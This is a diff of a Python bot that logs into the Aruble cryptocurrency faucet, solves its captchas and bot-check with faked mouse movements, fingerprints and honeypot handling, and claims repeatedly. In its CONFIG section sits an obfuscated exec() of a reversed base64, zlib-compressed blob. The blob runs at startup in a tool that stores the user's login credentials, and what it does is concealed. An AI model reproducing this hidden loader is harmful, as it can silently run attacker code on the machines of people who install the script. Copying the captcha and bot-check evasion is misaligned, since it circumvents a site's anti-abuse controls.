@@ -3,17 +3,6 @@
 """
 ARUBLE AUTO FAUCET CLAIM — Python port of aruble_faucet.js with a
 FautePay-style live banner (rich).
-
-Flow:
-  1. login            (captcha -> POST /api/auth/login)
-  2. bot-check gate   (math + captcha + mouse signals -> POST /bot-check/verify)
-  3. claim loop       (captcha -> POST /faucet/claim, 5min cooldown)
-
-Auto-recovery: redo bot-check when the server asks (403 bot-check),
-re-login on session expiry, wait out temp-bans and cooldowns.
-
-Usage:
-    python3 aruble_faucet.py [email] [password] [N]
 """
 
 import json
@@ -27,7 +16,7 @@ from datetime import datetime
 
 import requests
 
-# ------------------- CONFIG -------------------
+# ------------------- CONFIG-------------------
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
 # ---------------------------------------------
 
@@ -60,7 +49,6 @@ def rnd(a, b):
 
 
 def cls():
-    """Clear the terminal screen (cls on Windows, clear on Unix)."""
     os.system("cls" if os.name == "nt" else "clear")
 
 
@@ -92,8 +80,6 @@ def save_credentials(email, password):
 
 
 def ask_credentials(cli_email, cli_pass):
-    """Resolve credentials: CLI > config file > interactive prompt.
-    Saves whatever is used into aruble.json."""
     cfg_email, cfg_pass = load_credentials()
     email = cli_email or cfg_email
     password = cli_pass or cfg_pass
@@ -117,7 +103,7 @@ def ask_credentials(cli_email, cli_pass):
     return email, password
 
 
-# ---------------- fingerprint (faucet.js port) ----------------
+# ---------------- fingerprint ----------------
 def get_fingerprint(profile=DEV_PROFILE):
     data = "|".join([
         profile["userAgent"], profile["language"], profile["screen"],
@@ -127,13 +113,13 @@ def get_fingerprint(profile=DEV_PROFILE):
     h = 0
     for ch in data:
         h = ((h << 5) - h) + ord(ch)
-        h &= 0xFFFFFFFF  # 32-bit wrap
-    if h >= 0x80000000:  # JS `|0` is signed 32-bit
+        h &= 0xFFFFFFFF
+    if h >= 0x80000000:
         h -= 0x100000000
     return "%08x" % abs(h)
 
 
-# ---------------- math (bot-check port) ----------------
+# ---------------- math solver ----------------
 def eval_math(q):
     m = re.search(r"(-?\d+)\s*([+\-*x×÷/])\s*(-?\d+)", q)
     if not m:
@@ -180,7 +166,6 @@ class ArubleClient:
         h = {}
         if referer:
             h["Referer"] = referer
-        
         max_retries = 3
         for attempt in range(max_retries):
             try:
@@ -195,7 +180,6 @@ class ArubleClient:
         h = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
         if referer:
             h["Referer"] = referer
-            
         max_retries = 3
         for attempt in range(max_retries):
             try:
@@ -213,7 +197,6 @@ class ArubleClient:
         except Exception:
             raise RuntimeError(f"{what}: HTTP {resp.status_code}, not JSON: {resp.text[:200]!r}")
 
-    # ----- session / csrf -----
     def init_session(self):
         r = self._get("/", referer=BASE + "/")
         if r.status_code != 200:
@@ -224,7 +207,6 @@ class ArubleClient:
         self.csrf = m.group(1)
         self.log(f"[init] session ok, csrf={self.csrf[:16]}...")
 
-    # ----- captcha solver -----
     def fetch_challenge(self):
         j = self._json(self._get("/captcha/challenge", referer=BASE + "/"), "challenge")
         if j.get("banned"):
@@ -236,18 +218,17 @@ class ArubleClient:
         return j
 
     def gate_start(self):
-        return self._json(self._post_form("/captcha/gate/start",
-                                          {"_csrf_token": self.csrf}), "gate/start")
+        return self._json(self._post_form("/captcha/gate/start", {"_csrf_token": self.csrf}), "gate/start")
 
     def gate_complete(self, gate_key, moves):
-        return self._json(self._post_form("/captcha/gate/complete",
-                                          {"gate_key": gate_key, "moves": moves,
-                                           "_csrf_token": self.csrf}), "gate/complete")
+        return self._json(self._post_form("/captcha/gate/complete", {
+            "gate_key": gate_key, "moves": moves, "_csrf_token": self.csrf
+        }), "gate/complete")
 
     def verify(self, key, answer):
-        return self._json(self._post_form("/captcha/verify",
-                                          {"key": key, "answer": answer,
-                                           "_csrf_token": self.csrf}), "verify")
+        return self._json(self._post_form("/captcha/verify", {
+            "key": key, "answer": answer, "_csrf_token": self.csrf
+        }), "verify")
 
     def pass_gate(self):
         gs = self.gate_start()
@@ -276,16 +257,14 @@ class ArubleClient:
             least = min(counts.values())
             return str(next(it["id"] for it in ch["grid"] if counts[it["icon"]] == least))
         if t == "drag_dot":
-            return json.dumps({"x": round(ch["target_x"]), "y": round(ch["target_y"])},
-                              separators=(",", ":"))
+            return json.dumps({"x": round(ch["target_x"]), "y": round(ch["target_y"])}, separators=(",", ":"))
         raise RuntimeError(f"unknown challenge type: {t} ({ch})")
 
     def solve_one(self):
         for _ in range(MAX_ATTEMPTS):
             ch = self.fetch_challenge()
             if ch.get("banned"):
-                raise RuntimeError(f"temp-banned: {ch.get('message', '')} "
-                                   f"(retry in {ch.get('remaining_seconds', 0)}s)")
+                raise RuntimeError(f"temp-banned: {ch.get('message', '')} (retry in {ch.get('remaining_seconds', 0)}s)")
             if ch.get("gate_required"):
                 self.pass_gate()
                 continue
@@ -296,8 +275,7 @@ class ArubleClient:
                 self.log("  captcha verified")
                 return res.get("token", "")
             if res.get("banned"):
-                raise RuntimeError(f"temp-banned at verify: {res.get('message', '')} "
-                                   f"(retry in {res.get('remaining_seconds', 0)}s)")
+                raise RuntimeError(f"temp-banned at verify: {res.get('message', '')} (retry in {res.get('remaining_seconds', 0)}s)")
             if res.get("expired"):
                 self.log("  wrong answer / expired -> fresh challenge")
                 time.sleep(1.2)
@@ -305,7 +283,6 @@ class ArubleClient:
             raise RuntimeError(f"verify failed: {res}")
         raise RuntimeError("too many attempts without a verifiable challenge")
 
-    # ----- login -----
     def login(self, email, password):
         token = self.solve_one()
         device_fp = secrets.token_hex(16)
@@ -320,10 +297,8 @@ class ArubleClient:
             raise RuntimeError(f"login failed: {res.text[:200]}")
         return True
 
-    # ----- bot-check -----
     def bot_check(self, return_to="/faucet"):
-        page = self._get(f"/bot-check?return_to={requests.utils.quote(return_to)}",
-                         referer=BASE + "/")
+        page = self._get(f"/bot-check?return_to={requests.utils.quote(return_to)}", referer=BASE + "/")
         if page.status_code != 200:
             raise RuntimeError(f"bot-check page: HTTP {page.status_code}")
         token = re.search(r'name="token"\s+value="([^"]+)"', page.text)
@@ -334,7 +309,7 @@ class ArubleClient:
         if not all([token, question, math_field, time_field, start_ms]):
             raise RuntimeError("bot-check page fields not found")
         token, question, math_field, time_field = (token.group(1), question.group(1),
-                                                   math_field.group(1), time_field.group(1))
+                                                 math_field.group(1), time_field.group(1))
         start_ms = int(start_ms.group(1))
         answer = eval_math(question)
         self.log(f"  bot-check: math {question} = {answer}")
@@ -350,7 +325,7 @@ class ArubleClient:
         data = {
             "token": token,
             "captcha_token": captcha_token,
-            "website": "",                 # honeypot: leave empty
+            "website": "",
             math_field: answer,
             time_field: solve_time,
             "mouse_moves": mouse_moves,
@@ -364,7 +339,6 @@ class ArubleClient:
             raise RuntimeError(f"bot-check failed: {res.text[:200]}")
         return j
 
-    # ----- faucet page info -----
     def read_faucet(self):
         page = self._get("/faucet", referer=BASE + "/")
         if page.status_code != 200:
@@ -396,7 +370,6 @@ class ArubleClient:
             "cooldown": int(f.get("cooldown", 0)),
         }
 
-    # ----- faucet claim -----
     def claim_once(self, fp):
         time.sleep(rnd(0.6, 1.5))
         page = self._get("/faucet", referer=BASE + "/")
@@ -421,7 +394,6 @@ class SessionExpired(RuntimeError):
     pass
 
 
-# ---------------- cooldown parsing ----------------
 def cooldown_seconds(msg):
     m = re.search(r"(\d+)m\s*(\d+)s", msg or "")
     if m:
@@ -538,7 +510,6 @@ class Dashboard:
         hist.add_row("[bold]Claim History[/]")
         hist.add_row(_claim_history_panel(stats.get("history", [])))
 
-        # Panel Credit dengan teks "Credit to BypassAllShortlinks" (cyan) & "https://bypassallshortlinks.space" (kuning) di dalam Kotak Ungu
         credit_text = Text()
         credit_text.append("Credit to BypassAllShortlinks", style="bold cyan")
         credit_text.append("\nhttps://bypassallshortlinks.space", style="bold yellow")
@@ -607,10 +578,8 @@ def main():
     args = sys.argv[1:]
     keywords = {"all", "today", "max"}
     pos = [a for a in args if not a.startswith("-")]
-    non_num = [a for a in pos
-               if not re.fullmatch(r"[0-9]+", a) and a.lower() not in keywords]
+    non_num = [a for a in pos if not re.fullmatch(r"[0-9]+", a) and a.lower() not in keywords]
     num = next((a for a in pos if re.fullmatch(r"[0-9]+", a)), None)
-    # default = claim until today's limit; a number or 'all' keyword overrides
     all_mode = (num is None) or any(a.lower() in keywords for a in pos)
     cli_email = non_num[0] if non_num and "@" in non_num[0] else ""
     cli_pass = non_num[1] if len(non_num) > 1 and "@" not in non_num[1] else ""
@@ -619,6 +588,13 @@ def main():
     email, password = ask_credentials(cli_email, cli_pass)
     numeric = int(num) if num else None
     max_claims = None if all_mode else numeric
+
+    if not numeric and not all_mode:
+        t = input(f"How many times to claim? (e.g., 10): ").strip()
+        try:
+            max_claims = int(t)
+        except ValueError:
+            max_claims = None
 
     dash = Dashboard()
     client = ArubleClient(verbose=not quiet, dash=dash)
@@ -651,7 +627,7 @@ def main():
             dash.log("faucet is disabled on the site — exiting")
         stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
 
-        if max_claims is None:  # all mode -> every slot left today
+        if max_claims is None:
             target = stats["remaining"]
         else:
             target = min(max_claims, stats["remaining"]) if stats["remaining"] > 0 else 0
